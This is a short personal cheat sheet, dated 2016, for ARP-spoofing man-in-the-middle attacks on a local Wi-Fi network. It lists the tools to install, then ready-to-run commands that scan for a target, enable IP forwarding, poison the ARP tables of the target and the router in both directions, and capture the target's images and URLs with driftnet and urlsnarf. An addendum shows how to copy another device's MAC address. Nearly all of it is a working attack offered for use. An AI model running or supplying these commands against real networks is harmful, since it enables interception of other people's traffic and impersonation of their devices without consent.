#09-02-2016 - Man-in-the-middle / spoofing tests

#TOOLS
  apt-get install traceroute 	#if not installed. can be useful to get router ip (traceroute google.fr)
  apt-get install arp-scan	#know your network (or arp by default)
  apt-get install dsniff	#spoof & sniff
  apt-get install driftnet	#

#CORE Man-in-the-middle
  ifconfig -a | grep inet			#know your interface name & ip
  arp-scan --interface=wlan0 --localnet 	#(or arp -a) get target ip & router ip
  #for (( x=1; x <= 254; x++ )); do ping -c 3 192.168.0.$x; done	#...or the hard way :)
  #ping -b -i 5 -c 2 192.168.1.255		#ping broadcast (for ?)
  ping 192.168.1.29				#target ip

  sysctl -w net.ipv4.ip_forward=1		#ensure ip forwarding (otherwise, no browsing for the target)
  arpspoof -i wlan0 -t 192.168.1.29 192.168.1.1	#between target & router
  arpspoof -i wlan0 -t 192.168.1.1 192.168.1.29	#between router & target
  #arpspoof -i wlp3s0 -t 192.168.2.83 192.168.2.1 #simplKDE 
  
  driftnet -i wlan0	#show images
  urlsnarf -i wlan0	#doesn't work :(	

#...to be continued

#Addenum: change mac adress with ifconfig
sudo ifconfig wlp3s0 down
sudo ifconfig wlp3s0 hw ether 08:11:96:0a:51:e0     #this mac adress being the one you want to "borrow" (get it from arp -a)
sudo ifconfig wlp3s0 up
#Back to normal
sudo ifconfig wlp3s0 down
sudo ifconfig wlp3s0 hw ether 08:11:96:8d:f9:e8     #...and this one being yours (get it from ifconfig before you begin)
sudo ifconfig wlp3s0 up

